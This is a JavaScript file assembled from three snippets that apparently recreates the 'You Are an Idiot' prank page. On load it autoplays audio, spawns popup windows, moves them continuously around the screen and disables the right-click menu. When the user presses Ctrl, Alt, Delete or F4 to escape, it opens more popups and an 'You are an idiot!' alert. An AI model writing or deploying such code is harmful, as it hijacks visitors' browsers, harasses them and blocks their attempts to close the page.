// Code from the first snippet

let container = document.querySelector('#youare-container');
let audio = document.querySelector('#youare-audio');
let ovlap = document.querySelector('#youare-overlap');
let micon = document.querySelector('#youare-micon');
let overlap = false;

function audioPlay() {
    if (!overlap) {
        audio.currentTime = 0; 
        audio.play();
    } else {
        ovlap.currentTime = 0;
        ovlap.play();
    }

    container.removeEventListener('click', audioPlay);

    audio.addEventListener('timeupdate', audioOverlap);
    ovlap.addEventListener('timeupdate', audioOverlap);

    container.classList.remove('clicky');
    micon.src = "/images/speaker.png";
}

function audioStop() {
    audio.currentTime = 0;
    audio.pause();

    ovlap.currentTime = 0;
    ovlap.pause();

    container.addEventListener('click', audioPlay);

    audio.removeEventListener('timeupdate', audioOverlap);
    ovlap.removeEventListener('timeupdate', audioOverlap);

    container.classList.add('clicky');
    micon.src = "/images/speakerm.png";
}

function audioSwitch() {
    if (
        audio.duration > 0 && audio.paused &&
        ovlap.duration > 0 && ovlap.paused
    ) {
        audioPlay();
    } else {
        audioStop();
    }
}

function audioOverlap() {
    if (!overlap && audio.currentTime > audio.duration - 0.45) {
        ovlap.currentTime = 0;
        ovlap.play();
        overlap = true;
    }

    if (overlap && ovlap.currentTime > ovlap.duration - 0.5) {
        audio.currentTime = 0;
        audio.play();
        overlap = false;
    }
}

// Automatic triggering without a click
document.addEventListener('DOMContentLoaded', () => {
    audioPlay();
});

container.addEventListener('click', () => {
    container.classList.remove('clicky');
});

micon.addEventListener('click', audioSwitch);

// Code from the second snippet

let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = -100;

function randomRange(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1) + min);
}

function changeTitle(title) {
    document.title = title;
}

function openWindow(url) {
    window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

async function proCreate(count) {
    for (let i = 0; i < count; i++) {
        openWindow('lol.html');
        await new Promise(r => setTimeout(r, 50));
    }
}

function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newXrt() {
    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}

function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newYdn() {
    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 357 || xPos < 0) newXlt();
    if (yPos > screen.height - 330 || yPos < 0) newYup();

    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
}

// Automatic triggering without a click
document.addEventListener('DOMContentLoaded', () => {
    proCreate(5); // Adjust the count as needed
    playBall();
});

// Code from the third snippet



window.onload = playBall;
window.oncontextmenu = () => false;
window.onkeydown = async () => {
    if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
        await proCreate(6);
        alert("You are an idiot!");
    }

    return null;
} 
